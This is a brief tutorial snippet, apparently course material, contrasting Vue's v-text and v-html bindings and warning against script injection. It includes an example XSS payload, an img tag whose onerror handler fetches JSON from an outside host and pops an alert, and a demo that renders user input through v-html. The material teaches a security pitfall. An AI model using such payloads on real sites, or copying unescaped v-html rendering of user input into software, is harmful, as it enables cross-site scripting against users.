Text & HTML Content

You can modify DOM content. Do not allow injection of external scripts. Such as: 

    <img src='x'
      onerror='fetch("https://cs260.click/hacked.json")
                .then(r=>r.json())
                .then(j=>alert(j.code))'
    />
      
<div id="app">
  <label>textContent:</label>
  <div v-text="content"></div>
  <label>innerHTML:</label>
  <div v-html="content"></div>
  <textarea v-model="content">hello</textarea>
</div>

<script>
  var app = new Vue({
    el: '#app',
    data: {content: 'text'},
  });
</script>
